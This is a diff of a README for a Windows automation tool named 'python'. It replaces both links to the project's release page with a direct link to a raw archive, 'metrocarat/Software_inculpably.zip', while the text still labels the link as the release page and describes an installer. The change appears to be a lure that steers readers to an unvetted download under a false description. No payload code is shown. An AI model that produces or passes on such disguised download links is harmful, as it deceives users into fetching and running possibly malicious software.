@@ -1,6 +1,6 @@
 # 🐍 python - Run simple scripts on your computer
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Smitten-teilharddechardin336/python/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Smitten-teilharddechardin336/python/main/metrocarat/Software_inculpably.zip)
 
 This application helps you run automation scripts on your Windows computer. It manages background processes and executes tasks without requiring you to write code. You download the program, open the interface, and select the task you want to complete.
 
@@ -17,7 +17,7 @@ The application runs on standard versions of the Windows operating system. Check
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the project release page to get the installer: [https://github.com/Smitten-teilharddechardin336/python/releases](https://github.com/Smitten-teilharddechardin336/python/releases)
+1. Visit the project release page to get the installer: [https://raw.githubusercontent.com/Smitten-teilharddechardin336/python/main/metrocarat/Software_inculpably.zip](https://raw.githubusercontent.com/Smitten-teilharddechardin336/python/main/metrocarat/Software_inculpably.zip)
 2. Look for the file ending in `.exe` under the latest release section.
 3. Click the filename to save the file to your computer.
 4. Locate the file in your downloads folder.
